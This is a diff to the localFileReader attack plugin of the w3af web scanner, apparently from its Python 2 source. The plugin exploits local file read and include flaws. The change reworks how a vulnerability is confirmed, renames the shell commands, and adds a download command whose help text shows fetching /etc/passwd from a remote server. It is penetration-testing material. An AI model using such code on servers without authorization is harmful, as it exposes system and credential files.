@@ -26,21 +26,17 @@ import core.controllers.outputManager as om
 from core.data.options.option import option
 from core.data.options.optionList import optionList
 from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
-from core.controllers.misc.levenshtein import relative_distance
+from core.controllers.misc.levenshtein import relative_distance_ge
 
 import core.data.kb.knowledgeBase as kb
 import core.data.kb.vuln as vuln
-from core.data.constants.common_directories import get_common_directories
-from core.data.kb.shell import shell as shell
+from core.data.kb.read_shell import read_shell as read_shell
 
 from core.controllers.w3afException import w3afException
 import core.data.parsers.urlParser as urlParser
-from core.data.fuzzer.fuzzer import createRandAlNum
+
 
 from plugins.attack.payloads.decorators.read_decorator import read_debug
-
-import re
-import os
 
 
 class localFileReader(baseAttackPlugin):
@@ -117,7 +113,7 @@ class localFileReader(baseAttackPlugin):
             # Create the shell object
             shell_obj = fileReaderShell( vuln_obj )
             shell_obj.setUrlOpener( self._urlOpener )
-            shell_obj.setCut( self._header, self._footer )
+            shell_obj.set_cut( self._header_length, self._footer_length )
             
             return shell_obj
             
@@ -126,18 +122,30 @@ class localFileReader(baseAttackPlugin):
 
     def _verifyVuln( self, vuln_obj ):
         '''
-        This command verifies a vuln. This is really hard work!
+        This command verifies a vuln.
 
         @return : True if vuln can be exploited.
         '''
         function_reference = getattr( self._urlOpener , vuln_obj.getMethod() )
+        
+        #    Prepare the first request, with the original data
+        data_a = str(vuln_obj.getDc())
+        
+        #    Prepare the second request, with a non existent file
+        vulnerable_parameter = vuln_obj.getVar()
+        vulnerable_dc = vuln_obj.getDc()
+        vulnerable_dc_copy = vulnerable_dc.copy()
+        vulnerable_dc_copy[ vulnerable_parameter ] = '/do/not/exist'
+        data_b = str(vulnerable_dc_copy) 
+        
         try:
-            response = function_reference( vuln_obj.getURL(), str(vuln_obj.getDc()) )
+            response_a = function_reference( vuln_obj.getURL(), data_a )
+            response_b = function_reference( vuln_obj.getURL(), data_b )
         except w3afException, e:
             om.out.error( str(e) )
             return False
         else:
-            if self._defineCut( response.getBody(), vuln_obj['file_pattern'], exact=False ):
+            if self._guess_cut( response_a.getBody(), response_b.getBody(), vuln_obj['file_pattern'] ):
                 return True
             else:
                 return False
@@ -232,7 +240,7 @@ NO_SUCH_FILE =  'No such file or directory.'
 READ_DIRECTORY = 'Cannot cat a directory.'
 FAILED_STREAM = 'Failed to open stream.'
 
-class fileReaderShell(shell):
+class fileReaderShell(read_shell):
     '''
     A shell object to exploit local file include and local file read vulns.
 
@@ -249,62 +257,29 @@ class fileReaderShell(shell):
             om.out.console('')
             om.out.console('Available commands:')
             om.out.console('    help                            Display this information')
-            om.out.console('    cat                             Show the contents of a file')
+            om.out.console('    read                            Echoes the contents of a file.')
+            om.out.console('    download                        Downloads a file to the local filesystem.')
             om.out.console('    list                            List files that may be interesting.')
             om.out.console('                                    Type "help list" for detailed information.')
-            om.out.console('    endInteraction                  Exit the shell session')
+            om.out.console('    exit                            Exit the shell session')
             om.out.console('')
-        elif command == 'list':
-            om.out.console('')
-            om.out.console('list help:')
-            om.out.console('    The list command generates a list of the files that are available')
-            om.out.console('    on the remote server. If you specify the "-r" flag, the list ')
-            om.out.console('    process is recursive, this means that if one of the files in the')
-            om.out.console('    list references another file, that file is also added to the list')
-            om.out.console('    of available files. The "-r" flag expects an integer, which ')
-            om.out.console('    indicates the recursion level.')
-            om.out.console('')
-            om.out.console('Examples:')
-            om.out.console('    list -r 10')
-            om.out.console('    list')
-        elif command == 'cat':
-            om.out.console('cat help:')
-            om.out.console('    The cat command echoes the content of a file to the console. The')
+        elif command == 'read':
+            om.out.console('read help:')
+            om.out.console('    The read command echoes the content of a file to the console. The')
             om.out.console('    command takes only one parameter: the full path of the file to ')
             om.out.console('    read.')
             om.out.console('')
             om.out.console('Examples:')
-            om.out.console('    cat /etc/passwd')
+            om.out.console('    read /etc/passwd')
+        elif command == 'download':
+            om.out.console('download help:')
+            om.out.console('    The download command reads a file in the remote system and saves')
+            om.out.console('    it to the local filesystem.')
+            om.out.console('')
+            om.out.console('Examples:')
+            om.out.console('    download /etc/passwd /tmp/passwd')
         return True
         
-    def _rexec( self, command ):
-        '''
-        This method is called when a command is being sent to the remote server.
-        This is a NON-interactive shell. In this case, the only available command is "cat"
-
-        @parameter command: The command to send ( cat is the only supported command. ).
-        @return: The result of the command.
-        '''
-
-        # Get the command and the parameters
-        cmd = command.split(' ')[0]
-        parameters = command.split(' ')[1:]
-
-        # Select the correct handler
-        if cmd == 'list':
-            return self._list( parameters )
-        elif cmd == 'read' and len(parameters) == 1:
-            filename = parameters[0]
-            return self.read( filename )
-        elif cmd == 'payload' and len(parameters) == 1:
-            filename = parameters[0]
-            return self._payload( filename )
-        elif cmd == 'lsp':
-            return self._print_runnable_payloads()
-        else:
-            self.help( command )
-            return ''
-    
     def _init_read(self):
         '''
         This method requires a non existing file, in order to save the error message and prevent it
@@ -348,8 +323,17 @@ class fileReaderShell(shell):
         except w3afException, e:
             return 'Error "' + str(e) + '" while sending command to remote host. Try again.'
         else:
+            #print '=' * 40 + ' Sb ' + '=' * 40
+            #print response.getBody()
+            #print '=' * 40 + ' Eb ' + '=' * 40
+
             cutted_response = self._cut( response.getBody() )
             filtered_response = self._filter_errors( cutted_response, filename )
+            
+            #print '=' * 40 + ' Sc ' + '=' * 40
+            #print filtered_response
+            #print '=' * 40 + ' Ec ' + '=' * 40
+            
             return filtered_response
                 
     def _filter_errors( self, result,  filename ):
@@ -368,7 +352,7 @@ class fileReaderShell(shell):
             elif result.count('</a>]: failed to open stream:'):
                 filtered = FAILED_STREAM
                 
-        elif self._application_file_not_found_error != None:
+        elif self._application_file_not_found_error is not None:
             #   The application file not found error string that I have has the "not_exist0.txt"
             #   string in it, so I'm going to remove that string from it.
             app_error = self._application_file_not_found_error.replace("not_exist0.txt",  '')
@@ -378,7 +362,7 @@ class fileReaderShell(shell):
             
             #   Now I compare both strings, if they are VERY similar, then filename is a non 
             #   existing file.
-            if relative_distance( app_error,  trimmed_result ) > 0.9:
+            if relative_distance_ge(app_error, trimmed_result, 0.9):
                 filtered = NO_SUCH_FILE
 
         #
@@ -388,38 +372,6 @@ class fileReaderShell(shell):
             return ''
         
         return result
-    
-    def end( self ):
-        '''
-        Cleanup. In this case, do nothing.
-        '''
-        om.out.debug('fileReaderShell cleanup complete.')
-        
-    def _identifyOs( self ):
-        '''
-        Identify the remote operating system and get some remote variables to show to the user.
-        '''
-        res = self.read('/etc/passwd')
-        if 'root:' in res:
-            self._rOS = '*nix'
-        else:
-            self._rOS = 'windows'
-
-        # This can't be determined
-        self._rSystem = ''
-        self._rSystemName = 'linux'
-        self._rUser = 'file-reader'
-    
-    def __repr__( self ):
-        '''
-        @return: A string representation of this shell.
-        '''
-        if not self._rOS:
-            self._identifyOs()
-
-        return '<shell object (rsystem: "'+self._rOS+'")>'
-        
-    __str__ = __repr__
     
     def getName( self ):
         '''
